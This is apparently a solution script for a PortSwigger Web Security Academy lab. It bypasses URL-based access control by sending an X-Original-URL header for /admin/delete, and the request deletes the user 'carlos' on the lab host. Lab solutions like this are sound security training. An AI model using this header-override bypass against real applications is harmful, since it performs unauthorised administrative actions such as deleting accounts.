# Lab: URL-based access control can be circumvented
# https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented

import requests

session = requests.Session()
base_url = "https://ID.web-security-academy.net"

# add header X-Original-URL but pass the parameter in url
exploit_url = f"{base_url}/?username=carlos"
headers = {"X-Original-URL": "/admin/delete"}
response = session.get(exploit_url, headers=headers, allow_redirects=False)
if response.status_code == 302 and "Location" in response.headers:
    print("Lab likely solved (redirected after deletion)")